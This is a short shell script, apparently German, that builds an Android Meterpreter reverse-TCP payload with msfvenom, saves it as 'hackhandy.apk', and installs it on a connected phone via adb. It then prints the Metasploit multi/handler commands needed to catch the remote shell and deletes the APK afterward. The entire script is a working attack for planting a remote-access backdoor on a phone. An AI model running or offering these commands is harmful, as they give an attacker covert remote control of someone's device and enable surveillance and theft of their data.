adb devices
msfvenom -p android/meterpreter/reverse_tcp lhost="your ip"  lport="port" R >/root/hackhandy.apk
adb install /root/hackhandy.apk
echo ist drauf
echo MainActivity öffnen
echo use exploit/multi/handler
echo set PAYLOAD android/meterpreter/reverse_tcp
echo set LHOST "your ip"
echo set LPORT "port"
echo set ExitOnSession false
echo exploit -j
rm -r /root/hackhandy.apk
echo Success


